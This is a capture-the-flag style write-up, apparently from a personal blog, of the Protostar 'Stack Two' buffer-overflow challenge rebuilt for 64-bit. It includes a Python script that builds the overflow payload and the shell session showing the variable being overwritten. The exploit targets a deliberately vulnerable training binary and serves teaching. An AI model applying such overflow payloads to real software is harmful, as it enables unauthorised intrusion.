<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>pwncone.io</title>
    <link rel="stylesheet" href="../../../../css/style.css">
  </head>

<body>

<section>

    <writeup>
        <h1><strong>#Protostar x64 - Stack Two</strong></h1>
        <a href="https://exploit.education/protostar/stack-two/">https://exploit.education/protostar/stack-twp/</a><br>
        NOTE 1: Protostar doesn't offer 64-bit versions of the challenges itself. I set it up myself. For setup, refer <a href="../vm-setup/vm-setup.html">here</a><br>
        NOTE 2: I'm writing the 64-bit write-ups as follow-ups to the 32-bit challenges, so I won't be going over the intricacies of the exploit, just the differences involved with it now being a 64-bit challenge instead of 32-bit<br>
        <br>
        <img alt="images\8-1.png" src="images/8-1.png"><br>
        <br>
        The goal of Stack Two is to overflow the <code>buffer</code> variable and overwrite the <code>modified</code> variable on the stack with <code>0x0d0a0d0a</code>.<br>
        <br>
        For some reason the offset to the <code>modified</code> variable is only 68 bytes here, instead of the 76 bytes from the previous challenges.<br>
        I have no idea why.<br>
        <br>
        Pack <code>0x0d0a0d0a</code> as a 64-bit value with <code>struct.pack('&lt;Q'</code> and set the GREENIE environement variable with <code>export</code>.<br>
        <br>
            <div class="codebox">
                <span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br>
                <span style="color:#0088ff;font-weight:400">#&nbsp;exploit.education&nbsp;-&nbsp;Stack&nbsp;Two</span><br>
                <br>
                <span style="color:#333333;font-weight:400">import</span>&nbsp;struct<br>
                <br>
                <span style="color:#ff9d00;font-weight:700">buffer</span>&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">68</span><br>
                <br>
                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>&nbsp;*&nbsp;<span style="color:#ff9d00;font-weight:700">buffer</span><br>
                payload&nbsp;+=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x0d0a0d0a</span>)<br>
                <br>
                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;payload
            </div>
        </div><br>
        <br>
            <div class="codebox">
                user@ubuntu<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>protostar64$&nbsp;<span style="color:#ff9d00;font-weight:700">export</span>&nbsp;<span style="color:#7f0044;font-weight:400">GREENIE</span>=<span style="color:#333333;font-weight:400">`python&nbsp;stack2.py`</span><br>
                user@ubuntu<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>protostar64$&nbsp;bin<span style="color:#ff9d00;font-weight:700">/</span>stack2<br>
                you&nbsp;have&nbsp;correctly&nbsp;modified&nbsp;the&nbsp;variable
            </div>
        </div>
    </writeup>
</section>

</body>
</html>